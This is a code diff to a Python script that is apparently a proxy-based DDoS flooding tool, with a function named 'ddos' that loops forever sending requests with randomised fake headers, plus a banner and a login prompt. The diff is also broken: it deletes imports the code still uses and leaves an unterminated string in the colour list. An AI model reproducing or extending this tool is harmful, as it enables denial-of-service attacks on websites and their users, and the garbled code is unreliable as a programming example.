@@ -1,9 +1,12 @@
 #!/usr/bin/python3
 # -*- coding: utf-8  -*-
-import requests as r, os, threading, random, click, fake_headers
+import requests as r
+import os
+import threading
+import random
+import click
+import fake_headers
 from threading import Thread
-from colorama import Fore, Style, Back
-from fake_headers import Headers
 import time
 
 os.system("clear")
@@ -13,8 +16,7 @@ time.sleep(5)
 print("Loading.......")
 
 attemps = 0
-def display_header():
-    header_lines = [
+print("""
 f"{Fore.GREEN}═════════════════════════════════════════════════════",
 f"{Fore.GREEN} ╔═════╗",
 f"{Fore.GREEN} ██████║",
@@ -23,9 +25,8 @@ f"{Fore.GREEN}      █║",
 f"{Fore.GREEN}    █║",
 f"{Fore.GREEN}  █╚════╗",
 f"{Fore.GREEN} ██████╝",
-		
+""")
 
-	]
 while attemps < 100:
     username = input(f"{Fore.MAGENTA}Enter your username: ")
     password = input(f"{Fore.MAGENTA}Enter your password: ")
@@ -65,7 +66,7 @@ def check(ip, prox, url):
 
 def ddos(prox, url):
 	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
-	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
+	colors = ["\033[, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
 	color = random.choice(colors)
 	while True:
 		headers = Headers(headers=True).generate()
